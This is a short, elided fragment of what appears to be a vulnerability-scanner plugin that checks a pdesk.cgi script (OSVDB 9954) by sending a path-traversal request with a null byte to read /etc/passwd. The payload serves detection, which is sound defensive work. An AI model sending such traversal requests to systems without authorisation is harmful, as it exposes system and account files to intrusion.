...
if (description)
{
 ...
 script_xref(name:"OSVDB", value:"9954");
...
res = http_send_recv3(port:port, method:"GET", item:"/cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00");
if(isnull(res)) exit(1, "Null response to pdesk.cgi request.");
